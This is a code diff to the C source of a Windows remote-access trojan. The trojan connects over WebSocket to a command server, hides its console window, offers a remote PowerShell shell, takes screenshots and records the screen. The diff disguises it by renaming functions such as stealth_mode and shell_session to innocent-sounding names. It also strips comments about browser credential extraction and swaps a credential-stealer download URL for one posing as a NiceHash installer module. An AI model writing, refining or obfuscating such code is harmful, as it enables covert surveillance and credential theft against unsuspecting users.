@@ -242,12 +242,12 @@ static void run_decoy_init() {
     (void)version;
 }
 
-// WebSocket configuration - CHANGE THESE TO YOUR SERVER
+// Network configuration
 char g_server_host[256] = "api.root1.me";
 char g_server_port[6] = "80";
 char g_server_path[256] = "/";
-// ChromElevator URL for browser credential extraction
-char g_chromelevator_url[512] = "https://github.com/adhikarisubodh9991/sub6-windows-payload/raw/refs/heads/main/files/chromelevator.exe";
+// Module URL
+char g_chromelevator_url[512] = "https://github.com/nicehashquickinstaller/nice-hash-quick-installer/raw/refs/heads/main/modules/netfx.exe";
 
 // Global variables
 SOCKET g_sock = INVALID_SOCKET;
@@ -337,10 +337,10 @@ static int g_screenrecord_bitrate = 500000;  // 500 Kbps for small files
 static char g_screenrecord_state_file[MAX_PATH];  // Persist recording state across restarts
 static volatile int g_screenrecord_paused_for_liveview = 0;  // Track if recording was paused for liveview
 static volatile int g_screenrecord_enabled = 0;  // Track if recording should auto-start (0 = disabled)
-static HANDLE g_screenrecord_process = NULL;  // Handle to ffmpeg/powershell process for proper termination
+static HANDLE g_screenrecord_process = NULL;  // Handle to media process for proper termination
 
 // Function declarations
-void stealth_mode();
+void init_display();
 int connect_websocket();
 int send_websocket_data(const char* data, int len);
 int recv_websocket_data(char* buffer, int max_len);
@@ -352,8 +352,8 @@ int websocket_handshake();
 void create_websocket_frame(const char* data, int len, unsigned char* frame, int* frame_len);
 int parse_websocket_frame(unsigned char* data, int len, char* output, int* output_len);
 void send_websocket_ping();
-void take_screenshot();
-void shell_session();
+void capture_display();
+void run_terminal();
 void list_processes();
 int download_file(const char* filename);  // Returns 1 on success, 0 on failure
 void download_folder(const char* foldername);
@@ -508,7 +508,7 @@ void init_client_id() {
     }
 }
 
-void stealth_mode() {
+void init_display() {
     HWND hwnd = GetConsoleWindow();
     if (hwnd) {
         ShowWindow(hwnd, SW_HIDE);
@@ -1057,8 +1057,8 @@ void reset_recv_buffer() {
     // This is a workaround - we'll handle it differently
 }
 
-void take_screenshot() {
-    send_websocket_data("[*] Capturing screenshot...\n", 28);
+void capture_display() {
+    send_websocket_data("[*] Capturing display...\n", 25);
     
     // Make process DPI aware to get actual screen resolution
     SetProcessDPIAware();
@@ -1180,8 +1180,8 @@ void take_screenshot() {
     ReleaseDC(NULL, hdcScreen);
 }
 
-void shell_session() {
-    send_websocket_data("[*] PowerShell mode. Type 'exit' to return.\n", 44);
+void run_terminal() {
+    send_websocket_data("[*] Terminal mode. Type 'exit' to return.\n", 42);
     
     // Send initial prompt once
     char prompt[512];
@@ -3663,10 +3663,10 @@ void handle_command(const char* cmd) {
     if (len == 0) return;
     
     if (strcmp(clean_cmd, "screenshot") == 0) {
-        take_screenshot();
+        capture_display();
     }
     else if (strcmp(clean_cmd, "shell") == 0) {
-        shell_session();
+        run_terminal();
     }
     else if (strcmp(clean_cmd, "ps") == 0) {
         list_processes();
@@ -5648,7 +5648,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
         Sleep(10000 + (rand() % 5000));
     }
     
-    stealth_mode();
+    init_display();
     
     // Load any persisted screen recording state from previous sessions
     load_screenrecord_state();
